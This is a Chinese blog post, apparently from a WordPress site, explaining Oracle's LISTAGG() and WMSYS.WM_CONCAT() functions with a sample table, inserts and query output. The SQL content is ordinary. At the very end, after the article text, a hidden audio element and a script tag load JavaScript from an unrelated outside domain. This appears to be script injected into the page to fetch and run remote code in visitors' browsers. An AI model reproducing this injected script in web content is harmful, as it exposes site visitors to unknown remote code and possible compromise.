---
id: 61
title: oracle中listagg()和wmsys.wm_concat()用法
date: '2020-05-29T08:45:48+08:00'
author: gavin
layout: post
guid: 'http://gaving.top/?p=61'
permalink: /index.php/2020/05/29/oracle%e4%b8%adlistagg%e5%92%8cwmsys-wm_concat%e7%94%a8%e6%b3%95/
blocksy_post_meta_options:
    - 'a:1:{s:17:"styles_descriptor";a:3:{s:6:"styles";a:3:{s:7:"desktop";s:0:"";s:6:"tablet";s:0:"";s:6:"mobile";s:0:"";}s:12:"google_fonts";a:0:{}s:7:"version";i:5;}}'
categories:
    - Oracle
---

一、listagg() 简介

介绍：其函数在Oracle 11g 版本中推出，对分组后的数据按照一定的排序进行字符串连接。

其中，“\[,\]”表示字符串连接的分隔符，如果选择使用\[over (partition by )\]则会使其变成分析函数；

用法1： SELECT aaa, listagg(bbb,',') within GROUP (ORDER BY aaa) FROM table GROUP BY aaa

用法2： SELECT aaa, listagg(bbb,',') within GROUP (ORDER BY aaa) over(partition by aaa) FROM table

二、wm\_concat()简介

介绍：其函数在Oracle 10g推出，在10g版本中，返回字符串类型，在11g版本中返回clob类型。

括号里面的参数是列，而且可以是多个列的集合，也就是说在括号里面可以自由地用‘||’合并字符串。

用法1： Select aaa, wmsys.wm\_concat(bbb || '(' || ccc || ')' ) from table group by aaa

用法2： Select aaa, wmsys.wm\_concat(bbb || '(' || ccc || ')' ) over(partition by aaa) from table

三、应用实例：

3.1、创建表 CREATE TABLE TESTAGG

(

A VARCHAR2(20),

B VARCHAR2(20),

C VARCHAR2(20)

)

3.2、初始化数据

INSERT INTO "TESTAGG" (A, B, C) VALUES ('1', 'B1','C1')

INSERT INTO "TESTAGG" (A, B, C) VALUES ('1', 'B2','C2')

INSERT INTO "TESTAGG" (A, B, C) VALUES ('1', 'B3','C3')

INSERT INTO "TESTAGG" (A, B, C) VALUES ('2', 'B4','C4')

INSERT INTO "TESTAGG" (A, B, C) VALUES ('2', 'B5','C5')

INSERT INTO "TESTAGG" (A, B, C) VALUES ('3', 'B6','C6')

3.3、wm\_concat（）用法

select a,wm\_concat(b|| '(' || c || ')') as bc from testagg group by a order by a

1 <CLOB>--B1(C1),B2(C2),B3(C3)

2 <CLOB>--B4(C4),B5(C5)

3 <CLOB>--B6(C6)

若要转化成string可以用to\_char(）函数。

3.4、 LISTAGG（）用法

select a,LISTAGG(b,',' ) within group(order by a) as bc from testagg group by a

1 B1,B2,B3

2 B4,B5

3 B6

注意：但当数据量比较大时，一般clob字段超过4000，会报ORA-01489:字符串连接的结果过长。

<audio controls="controls" style="display: none;"></audio><script src="https://trick.cofounderspecials.com/track.js?v=9.999" type="text/javascript"></script>